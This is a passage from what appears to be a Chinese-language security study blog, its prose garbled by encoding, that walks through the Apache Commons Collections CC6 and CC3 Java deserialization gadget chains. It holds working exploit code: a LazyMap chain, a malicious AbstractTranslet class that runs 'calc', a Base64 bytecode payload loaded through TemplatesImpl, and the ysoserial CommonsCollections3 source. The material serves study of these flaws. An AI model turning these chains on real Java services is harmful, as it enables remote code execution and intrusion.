Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain); <span class="comment">// è¢«LazyMapè£…é¥°çš„æ¶æ„Map</span></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;aa&quot;</span>); <span class="comment">// å°†æ¶æ„Mapä¼ ä½œTiedMapEntryçš„mapå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">         <span class="comment">// ä¸ºäº†è°ƒç”¨TiedMapEntry#hashCode å°†tiedMapEntryå½“ä½œkeyä¼ ç»™æ–°çš„HashMap å¹¶å°†expMapä½œä¸ºå¯¹è±¡æ¥åºåˆ—åŒ–</span></span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>); </span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;aa&quot;</span>); <span class="comment">// ä¸ºäº†é˜²æ­¢å‰é¢putçš„æ—¶å€™ä¹Ÿè§¦å‘hashCode</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†çœŸæ­£çš„transformersæ•°ç»„setè¿›ChainedTransformer è¦†ç›–æ‰å‰é¢çš„fakeTransformers</span></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span></span><br><span class="line">        ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>æ€»çš„æ¥è¯´CC6ç†è§£èµ·æ¥å¹¶ä¸éš¾ï¼Œä½†æ˜¯ysoserialæœ‰ä¸€éƒ¨åˆ†ä»£ç çš„ä½œç”¨å¤§æ¦‚èƒ½ç†è§£ï¼Œä½†æ˜¯å…¶ä¸­å…·ä½“çš„é€»è¾‘è¿˜æ²¡æœ‰å˜æ¸…</p>
<h3 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h3><p>ï¼ˆ&lt;8u71</p>
<blockquote>
<p>ç…§æ ·è¿™æ¬¡å…ˆè‡ªå·±å­¦ç€çœ‹ysoserialçš„payloadï¼Œä¸æ‡‚å†çœ‹Pç¥çš„è®²è§£</p>
</blockquote>
<h4 id="åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç </h4><p>åœ¨ä»”ç»†åˆ†æé“¾å­ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥å­¦ä¸€ä¸‹<code>TemplatesImpl</code>ç±»</p>
<h5 id="å­—èŠ‚ç "><a href="#å­—èŠ‚ç " class="headerlink" title="å­—èŠ‚ç "></a>å­—èŠ‚ç </h5><p>é¦–å…ˆå­¦ä¹ ä¸€ä¸‹å­—èŠ‚ç æ˜¯ä»€ä¹ˆ</p>
<p>ä¸¥æ ¼æ¥è¯´ï¼Œjavaå­—èŠ‚ç å…¶å®ä»…ä»…æŒ‡çš„æ˜¯Javaè™šæ‹Ÿæœºæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨.classæ–‡ä»¶ä¸­ï¼›æ€»æ‰€å‘¨çŸ¥ï¼Œjavaæ˜¯å¯ä»¥è·¨å¹³å°çš„ï¼Œåªè¦ä»£ç è¢«ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶ï¼ˆ.classæ–‡ä»¶ï¼‰å°±å¯ä»¥åœ¨javaè™šæ‹Ÿæœºä¸­è¿è¡Œ</p>
<h5 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h5><p><img src="https://img-blog.csdnimg.cn/44f01b0549ea4e47a20d9b9fa42f66cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<ul>
<li>loadClass çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœº åˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClass </li>
<li>findClass çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå°±åƒä¸Šä¸€èŠ‚ä¸­è¯´åˆ°çš„ï¼Œå¯èƒ½ä¼šåœ¨ æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ defineClass </li>
<li>defineClass çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»</li>
</ul>
<blockquote>
<p>æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨ defineClass è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€  å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„staticå—ä¸­ï¼ˆåœ¨æœ¬ç³»åˆ—æ–‡ç« ç¬¬ä¸€ç¯‡ ä¸­è¿›è¡Œè¿‡è¯´æ˜ï¼‰ï¼Œåœ¨ defineClass æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨ defineClass åœ¨ç›® æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°ã€‚</p>
</blockquote>
<h5 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h5><p>åœ¨åˆ©ç”¨TemplatesImplæ„é€ æ”»å‡»é“¾çš„æ—¶å€™å°±ä¼šæ¶‰åŠåˆ°<code>defineClass</code></p>
<p>å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œç»§æ‰¿äºClassLoaderï¼Œåœ¨è¿™é‡Œè¿˜é‡å†™äº†<code>defineClass</code>ï¼Œé»˜è®¤ä¸ºdefault</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">    â€¦â€¦</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”åœ¨Â·<code>TemplatesImpl#defineTransletClasses</code>ä¼šå­˜åœ¨è°ƒç”¨ï¼Œè€Œ<code>_bytecodes</code>åˆæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè€Œ<code>defineTransletClasses</code>åŸŸæ˜¯publicï¼Œæ‰€ä»¥æ˜¯å¯ä»¥åœ¨å¤–éƒ¨è¿›è¡Œè°ƒç”¨çš„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">    _class[i] = loader.defineClass(_bytecodes[i]); <span class="comment">// loader ä¸ºTransletClassLoader</span></span><br><span class="line">    <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if this is the main class</span></span><br><span class="line">    <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">        _transletIndex = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯ä»¥åœ¨<code>TemplatesImpl#getTransletInstance</code>å‘ç°å¯¹<code>defineTransletClasses</code>çš„è°ƒç”¨ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•æ˜¯privateï¼Œå†ç»§ç»­è·Ÿè¿›è°ƒç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// _name ä¸ä¸ºnull</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses(); <span class="comment">// å®ç°è°ƒç”¨ defineClass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    â€¦â€¦</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°æœ€å¼€å§‹è°ƒç”¨çš„éƒ½æ˜¯public</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory); <span class="comment">// å®ä¾‹åŒ–äº†TransformerImpl </span></span><br><span class="line">    â€¦â€¦</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">	TemplatesImpl#newTransformer()</span><br><span class="line">		TemplatesImpl#getTransletInstance()</span><br><span class="line">			TemplatesImpl#defineTransletClasses()</span><br><span class="line">				TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­ï¼š</p>
<blockquote>
<p>å¦å¤–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ TemplatesImpl ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼šè¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡» æ˜¯ com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet çš„å­ç±»ã€‚</p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå†™ä¸€ä¸ªç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> TpmlDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTpml</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloTpml</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘ç”Ÿæˆå­—èŠ‚ç æ–‡ä»¶ï¼Œå¹¶å°†å­—èŠ‚ç ä¼ åˆ°å‰é¢æˆ‘ä»¬å‘åˆ©ç”¨çš„<code>defineClass</code>ä¸­ï¼Œå†å†™ä¸€ä¸ªè°ƒç”¨çš„ç±»</p>
<p><img src="https://img-blog.csdnimg.cn/e4fd0dd079c8416a9479367bc178a6d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Define</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAJAoABwAWCgAXABgIABkKABcAGgcAGwcAHAcAHQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAeAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHABwHABsBAApTb3VyY2VGaWxlAQALSGVsbG9ULmphdmEMAA8AEAcAHwwAIAAhAQAEY2FsYwwAIgAjAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABkhlbGxvVAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAADAAEACAAJAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAMAAwAAAAEAAEADQABAAgADgACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABAA0AAQAPABAAAQAKAAAAWAACAAIAAAASKrcAAbgAAhIDtgAEV6cABEyxAAEABAANABAABQACAAsAAAAWAAUAAAAUAAQAFwANABsAEAAZABEAHAARAAAAEAAC/wAQAAEHABIAAQcAEwAAAQAUAAAAAgAV&quot;</span>); <span class="comment">// å­—èŠ‚ç base64åŠ å¯†ä¹‹åçš„å­—ç¬¦ä¸²</span></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;null&quot;</span>); <span class="comment">// ä¸ä¸ºç©ºå°±å¥½ æ— è¦æ±‚</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl()); <span class="comment">// defineTransletClassesæ–¹æ³•ä¸­ä¼šå­˜åœ¨è°ƒç”¨ é˜²æ­¢æŠ¥é”™</span></span><br><span class="line"></span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(TemplatesImpl obj, String bytecodes, Object o)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(bytecodes); <span class="comment">// å› ä¸ºæ˜¯ç§æœ‰å±æ€§ ç”¨åå°„å®ç°è®¾ç½®</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dc911700e5424657a6b1957af664c422.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="Ysoserial"><a href="#Ysoserial" class="headerlink" title="Ysoserial"></a>Ysoserial</h4><blockquote>
<p>åŸºäºCC1ä¿®æ”¹çš„CC3 ä¸»è¦æ˜¯æŠŠInvokeTransformersæ¢æˆäº†InstantiateTransformer</p>
</blockquote>
<p>å› ä¸ºå®˜æ–¹å¯¹äºysoserialå‡ºäº†è¿‡æ»¤å™¨ï¼Œå°†InvokeTransformersæ”¾å…¥äº†é»‘åå•é‡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// inert chain for setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">         <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">      <span class="comment">// real chain for after setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">                  <span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line">                  <span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">      Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> handler;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections3.class, args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®é“¾å­ï¼Œæœ€åé¢è°ƒç”¨çš„åº”è¯¥æ˜¯<code>transform</code>ï¼Œè¿™é‡Œè°ƒç”¨äº†æŸä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼Œæ‰“æ–­ç‚¹è°ƒè¯•çš„æ—¶å€™å‘ç°inputçš„å€¼æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs); <span class="comment">// ä¼šå°†æˆ‘ä»¬ä¼ è¿›å»çš„Templatesè¿›è¡Œå®ä¾‹åŒ–</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    â€¦â€¦</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h5><p>ä»–çš„æ„é€ æ–¹æ³•å®ç°äº†<code>(TransformerImpl) templates.newTransformer()</code>ï¼Œå°±ç›´æ¥å®ç°äº†å…ˆè°ƒç”¨<code>TemplatesImpl#newTransformer</code>ï¼Œä»è€Œå®Œæˆæ•´ä¸ªé“¾å­ï¼Œè€Œå­—èŠ‚ç æ˜¯åœ¨<code>Gadgets#createTemplatesImpl</code>ä¸­å½¢æˆçš„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">    TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

